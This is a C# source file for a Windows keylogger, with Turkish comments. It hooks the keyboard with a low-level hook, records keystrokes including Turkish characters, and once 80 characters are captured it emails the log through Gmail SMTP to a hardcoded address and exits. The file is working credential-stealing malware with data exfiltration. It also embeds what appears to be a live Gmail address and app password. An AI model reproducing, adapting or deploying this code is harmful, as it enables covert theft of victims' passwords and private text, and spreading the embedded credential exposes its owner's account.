using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KeyLoggerProje
{
    class Program
    {
        // --- BURAYI KENDİ BİLGİLERİNLE DOLDUR ---
        private const string SENDER_EMAIL = "ayarline08@gmail.com";
        private const string RECEIVER_EMAIL = "ayarline08@gmail.com";
        private const string APP_PASSWORD = "dfor lqyg cbzr lysx";
        // ---------------------------------------------

        // --- KEYLOGGER AYARLARI ---
        private const int CHAR_LIMIT = 80;
        private static StringBuilder log = new StringBuilder();
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll")]
        static extern short GetKeyState(int nVirtKey);

        static void Main(string[] args)
        {
            Console.WriteLine("Keylogger başlatıldı. Arka planda dinleniyor...");
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                bool isShiftPressed = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);

                string character = "";

                if (key >= Keys.A && key <= Keys.Z)
                {
                    string temp = key.ToString();
                    if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn))
                    {
                        character = temp.ToUpper();
                    }
                    else
                    {
                        character = temp.ToLower();
                    }
                }
                else if (key >= Keys.D0 && key <= Keys.D9)
                {
                    character = key.ToString().Substring(1);
                }
                else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                {
                    character = key.ToString().Replace("NumPad", "");
                }
                else
                {
                    // --- TÜRKÇE KARAKTER EŞLEŞMELERİ DÜZELTİLDİ ---
                    switch (key)
                    {
                        case Keys.Space: character = " "; break;
                        case Keys.Enter: character = "\n"; break;
                        case Keys.Oem7: character = isShiftPressed ? "İ" : "i"; break;
                        case Keys.Oem1: character = isShiftPressed ? "Ş" : "ş"; break;
                        // Geri bildirimine göre düzeltilen eşleşmeler:
                        case Keys.OemOpenBrackets: character = isShiftPressed ? "Ğ" : "ğ"; break; // Ğ tuşu
                        case Keys.Oem6: character = isShiftPressed ? "Ü" : "ü"; break; // Ü tuşu
                        case Keys.Oem5: character = isShiftPressed ? "Ç" : "ç"; break; // Ç tuşu
                        case Keys.OemQuestion: character = isShiftPressed ? "Ö" : "ö"; break; // Ö tuşu
                        case Keys.Back:
                            if (log.Length > 0) log.Remove(log.Length - 1, 1);
                            break;
                    }
                }

                log.Append(character);

                if (log.Length >= CHAR_LIMIT)
                {
                    Console.WriteLine("Limite ulaşıldı, e-posta gönderiliyor...");
                    SendEmail(log.ToString());
                    UnhookWindowsHookEx(_hookID);
                    Environment.Exit(0);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void SendEmail(string messageBody)
        {
            try
            {
                var smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    Credentials = new NetworkCredential(SENDER_EMAIL, APP_PASSWORD),
                    EnableSsl = true,
                };
                var mailMessage = new MailMessage
                {
                    From = new MailAddress(SENDER_EMAIL),
                    Subject = "C# Keylogger Verisi",
                    Body = messageBody,
                    BodyEncoding = Encoding.UTF8
                };
                mailMessage.To.Add(RECEIVER_EMAIL);
                smtpClient.Send(mailMessage);
                Console.WriteLine("E-posta başarıyla gönderildi.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"E-posta gönderilirken hata oluştu: {ex.Message}");
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}